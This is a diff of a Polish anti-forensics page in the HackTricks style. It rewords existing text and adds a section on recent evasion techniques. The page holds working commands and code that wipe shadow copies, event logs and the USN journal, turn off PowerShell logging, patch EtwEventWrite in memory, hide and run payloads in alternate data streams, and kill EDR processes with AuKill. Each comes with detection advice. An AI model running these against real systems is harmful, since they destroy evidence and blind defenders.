@@ -7,7 +7,7 @@
 Atakujący może być zainteresowany **zmianą znaczników czasu plików**, aby uniknąć wykrycia.\
 Możliwe jest znalezienie znaczników czasu w MFT w atrybutach `$STANDARD_INFORMATION` \_\_ i \_\_ `$FILE_NAME`.
 
-Oba atrybuty mają 4 znaczniki czasu: **Modyfikacja**, **dostęp**, **utworzenie** i **modyfikacja rejestru MFT** (MACE lub MACB).
+Oba atrybuty mają 4 znaczniki czasu: **Modyfikacja**, **dostęp**, **tworzenie** i **modyfikacja rejestru MFT** (MACE lub MACB).
 
 **Eksplorator Windows** i inne narzędzia pokazują informacje z **`$STANDARD_INFORMATION`**.
 
@@ -31,7 +31,7 @@ Poprzedni obrazek to **wyjście** pokazane przez **narzędzie**, gdzie można za
 
 Ponownie, w wyjściu narzędzia można zobaczyć, że **wprowadzono pewne zmiany**.
 
-Używając tego samego narzędzia, możliwe jest zidentyfikowanie, **do którego czasu zmodyfikowano znaczniki czasu**:
+Używając tego samego narzędzia, można zidentyfikować, **do którego czasu zmodyfikowano znaczniki czasu**:
 
 ![](<../../images/image (1089).png>)
 
@@ -50,22 +50,22 @@ Innym sposobem na zidentyfikowanie podejrzanych zmodyfikowanych plików byłoby 
 
 ### SetMace - Narzędzie Antyforensyczne
 
-To narzędzie może modyfikować oba atrybuty `$STARNDAR_INFORMATION` i `$FILE_NAME`. Jednak od Windows Vista, konieczne jest, aby system operacyjny był uruchomiony, aby zmodyfikować te informacje.
+To narzędzie może modyfikować oba atrybuty `$STARNDAR_INFORMATION` i `$FILE_NAME`. Jednak od Windows Vista, konieczne jest, aby system operacyjny na żywo mógł modyfikować te informacje.
 
 ## Ukrywanie Danych
 
-NFTS używa klastra i minimalnego rozmiaru informacji. Oznacza to, że jeśli plik zajmuje i używa klastra i pół, **pozostała połowa nigdy nie będzie używana** aż do usunięcia pliku. Wtedy możliwe jest **ukrycie danych w tej przestrzeni zapasowej**.
+NFTS używa klastra i minimalnego rozmiaru informacji. Oznacza to, że jeśli plik zajmuje i używa klastra i pół, **pozostała połowa nigdy nie będzie używana** aż do usunięcia pliku. Wtedy możliwe jest **ukrycie danych w tej przestrzeni luzem**.
 
 Istnieją narzędzia takie jak slacker, które pozwalają na ukrywanie danych w tej "ukrytej" przestrzeni. Jednak analiza `$logfile` i `$usnjrnl` może pokazać, że dodano pewne dane:
 
 ![](<../../images/image (1060).png>)
 
-Wtedy możliwe jest odzyskanie przestrzeni zapasowej za pomocą narzędzi takich jak FTK Imager. Należy zauważyć, że tego rodzaju narzędzie może zapisać zawartość w sposób zniekształcony lub nawet zaszyfrowany.
+Wtedy możliwe jest odzyskanie przestrzeni luzem za pomocą narzędzi takich jak FTK Imager. Należy zauważyć, że tego rodzaju narzędzie może zapisać zawartość w sposób zniekształcony lub nawet zaszyfrowany.
 
 ## UsbKill
 
 To narzędzie, które **wyłączy komputer, jeśli wykryje jakąkolwiek zmianę w portach USB**.\
-Sposobem na odkrycie tego byłoby sprawdzenie uruchomionych procesów i **przeglądanie każdego uruchomionego skryptu python**.
+Sposobem na odkrycie tego byłoby sprawdzenie uruchomionych procesów i **przejrzenie każdego uruchomionego skryptu Pythona**.
 
 ## Dystrybucje Live Linux
 
@@ -77,11 +77,11 @@ Te dystrybucje są **uruchamiane w pamięci RAM**. Jedynym sposobem na ich wykry
 
 ## Konfiguracja Windows
 
-Możliwe jest wyłączenie kilku metod logowania w Windows, aby znacznie utrudnić dochodzenie forensyczne.
+Możliwe jest wyłączenie kilku metod logowania w systemie Windows, aby znacznie utrudnić dochodzenie forensyczne.
 
 ### Wyłącz Znaczniki Czasu - UserAssist
 
-To klucz rejestru, który przechowuje daty i godziny, kiedy każdy plik wykonywalny był uruchamiany przez użytkownika.
+To klucz rejestru, który utrzymuje daty i godziny, kiedy każdy plik wykonywalny był uruchamiany przez użytkownika.
 
 Wyłączenie UserAssist wymaga dwóch kroków:
 
@@ -100,7 +100,7 @@ To zapisze informacje o aplikacjach uruchamianych w celu poprawy wydajności sys
 
 ### Wyłącz Znaczniki Czasu - Czas Ostatniego Dostępu
 
-Kiedy folder jest otwierany z woluminu NTFS na serwerze Windows NT, system zajmuje czas na **aktualizację pola znacznika czasu dla każdego wymienionego folderu**, nazywanego czasem ostatniego dostępu. Na mocno używanym woluminie NTFS może to wpływać na wydajność.
+Kiedy folder jest otwierany z woluminu NTFS na serwerze Windows NT, system zajmuje czas na **aktualizację pola znacznika czasu w każdym wymienionym folderze**, nazywanego czasem ostatniego dostępu. Na mocno używanym woluminie NTFS może to wpłynąć na wydajność.
 
 1. Otwórz Edytor Rejestru (Regedit.exe).
 2. Przejdź do `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
@@ -109,7 +109,7 @@ Kiedy folder jest otwierany z woluminu NTFS na serwerze Windows NT, system zajmu
 
 ### Usuń Historię USB
 
-Wszystkie **Wpisy Urządzeń USB** są przechowywane w Rejestrze Windows pod kluczem **USBSTOR**, który zawiera podklucze tworzone za każdym razem, gdy podłączasz urządzenie USB do swojego komputera lub laptopa. Możesz znaleźć ten klucz tutaj `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Usunięcie tego** spowoduje usunięcie historii USB.\
+Wszystkie **Wpisy Urządzeń USB** są przechowywane w rejestrze Windows pod kluczem **USBSTOR**, który zawiera podklucze tworzone za każdym razem, gdy podłączasz urządzenie USB do swojego komputera lub laptopa. Możesz znaleźć ten klucz tutaj `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Usunięcie tego** spowoduje usunięcie historii USB.\
 Możesz również użyć narzędzia [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html), aby upewnić się, że je usunąłeś (i aby je usunąć).
 
 Innym plikiem, który zapisuje informacje o USB, jest plik `setupapi.dev.log` wewnątrz `C:\Windows\INF`. Ten plik również powinien zostać usunięty.
@@ -119,7 +119,7 @@ Innym plikiem, który zapisuje informacje o USB, jest plik `setupapi.dev.log` we
 **Wylistuj** kopie cieni za pomocą `vssadmin list shadowstorage`\
 **Usuń** je, uruchamiając `vssadmin delete shadow`
 
-Możesz również usunąć je za pomocą GUI, postępując zgodnie z krokami opisanymi w [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)
+Możesz również usunąć je za pomocą GUI, postępując zgodnie z krokami zaproponowanymi w [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)
 
 Aby wyłączyć kopie cieni, [kroki stąd](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):
 
@@ -127,11 +127,11 @@ Aby wyłączyć kopie cieni, [kroki stąd](https://support.waters.com/KB_Inf/Oth
 2. Z listy znajdź "Kopia Cienia Woluminu", wybierz ją, a następnie uzyskaj dostęp do Właściwości, klikając prawym przyciskiem myszy.
 3. Wybierz Wyłączone z rozwijanego menu "Typ uruchomienia", a następnie potwierdź zmianę, klikając Zastosuj i OK.
 
-Możliwe jest również modyfikowanie konfiguracji, które pliki mają być kopiowane w kopii cienia w rejestrze `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`
+Możliwe jest również modyfikowanie konfiguracji, które pliki będą kopiowane w kopii cienia w rejestrze `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`
 
 ### Nadpisz usunięte pliki
 
-- Możesz użyć **narzędzia Windows**: `cipher /w:C` To spowoduje, że cipher usunie wszelkie dane z dostępnej nieużywanej przestrzeni dyskowej wewnątrz dysku C.
+- Możesz użyć **narzędzia Windows**: `cipher /w:C` To wskaże cipher, aby usunąć wszelkie dane z dostępnej nieużywanej przestrzeni dyskowej wewnątrz dysku C.
 - Możesz również użyć narzędzi takich jak [**Eraser**](https://eraser.heidi.ie)
 
 ### Usuń dzienniki zdarzeń Windows
@@ -142,12 +142,80 @@ Możliwe jest również modyfikowanie konfiguracji, które pliki mają być kopi
 
 ### Wyłącz dzienniki zdarzeń Windows
 
-- `reg add 'HKLM\SYSTEM\CurrentControlSet\Services\eventlog' /v Start /t REG_DWORD /d 4 /f`
+- `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
 - W sekcji usług wyłącz usługę "Dziennik Zdarzeń Windows"
 - `WEvtUtil.exec clear-log` lub `WEvtUtil.exe cl`
 
 ### Wyłącz $UsnJrnl
 
 - `fsutil usn deletejournal /d c:`
+
+---
+
+## Zaawansowane Logowanie i Manipulacja Śladami (2023-2025)
+
+### Logowanie Skryptów/Modułów PowerShell
+
+Najnowsze wersje Windows 10/11 i Windows Server przechowują **bogate artefakty forensyczne PowerShell** w
+`Microsoft-Windows-PowerShell/Operational` (zdarzenia 4104/4105/4106).
+Atakujący mogą je wyłączyć lub usunąć w locie:
+```powershell
+# Turn OFF ScriptBlock & Module logging (registry persistence)
+New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
+-Name EnableScriptBlockLogging -Value 0 -PropertyType DWord -Force
+New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" \
+-Name EnableModuleLogging -Value 0 -PropertyType DWord -Force
+
+# In-memory wipe of recent PowerShell logs
+Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
+Remove-WinEvent               # requires admin & Win11 23H2+
+```
+Obrońcy powinni monitorować zmiany w tych kluczach rejestru oraz wysoką ilość usunięć zdarzeń PowerShell.
+
+### Łatka ETW (Event Tracing for Windows)
+
+Produkty zabezpieczeń punktów końcowych w dużym stopniu polegają na ETW. Popularną metodą unikania wykrycia w 2024 roku jest
+łatkowanie `ntdll!EtwEventWrite`/`EtwEventWriteFull` w pamięci, aby każde wywołanie ETW zwracało `STATUS_SUCCESS`
+bez emitowania zdarzenia:
+```c
+// 0xC3 = RET on x64
+unsigned char patch[1] = { 0xC3 };
+WriteProcessMemory(GetCurrentProcess(),
+GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
+patch, sizeof(patch), NULL);
+```
+Publiczne PoCs (np. `EtwTiSwallow`) implementują tę samą prymitywę w PowerShell lub C++.  
+Ponieważ łatka jest **lokalna dla procesu**, EDR-y działające w innych procesach mogą ją przeoczyć.  
+Wykrywanie: porównaj `ntdll` w pamięci z tym na dysku lub zainstaluj hook przed trybem użytkownika.
+
+### Odrodzenie Alternatywnych Strumieni Danych (ADS)
+
+Kampanie złośliwego oprogramowania w 2023 roku (np. **FIN12** loader) były widziane, gdy przygotowywały binaria drugiego etapu wewnątrz ADS, aby pozostać poza zasięgiem tradycyjnych skanerów:
+```cmd
+rem Hide cobalt.bin inside an ADS of a PDF
+type cobalt.bin > report.pdf:win32res.dll
+rem Execute directly
+wmic process call create "cmd /c report.pdf:win32res.dll"
+```
+Enumeruj strumienie za pomocą `dir /R`, `Get-Item -Stream *` lub Sysinternals `streams64.exe`. Skopiowanie pliku hosta na FAT/exFAT lub przez SMB usunie ukryty strumień i może być użyte przez śledczych do odzyskania ładunku.
+
+### BYOVD & “AuKill” (2023)
+
+Bring-Your-Own-Vulnerable-Driver jest teraz rutynowo używany do **anti-forensics** w intruzjach ransomware. Narzędzie open-source **AuKill** ładuje podpisany, ale podatny sterownik (`procexp152.sys`), aby wstrzymać lub zakończyć EDR i czujniki forensyczne **przed szyfrowaniem i zniszczeniem logów**:
+```cmd
+AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
+AuKill.exe -k CrowdStrike
+```
+Sterownik jest usuwany później, pozostawiając minimalne artefakty.  
+Środki zaradcze: włącz listę blokowania podatnych sterowników Microsoftu (HVCI/SAC) i powiadamiaj o tworzeniu usług jądra z ścieżek zapisywalnych przez użytkownika.
+
+---
+
+## Odniesienia
+
+- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (marzec 2023)  
+https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr  
+- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (czerwiec 2024)  
+https://redcanary.com/blog/etw-patching-detection  
 
 {{#include ../../banners/hacktricks-training.md}}
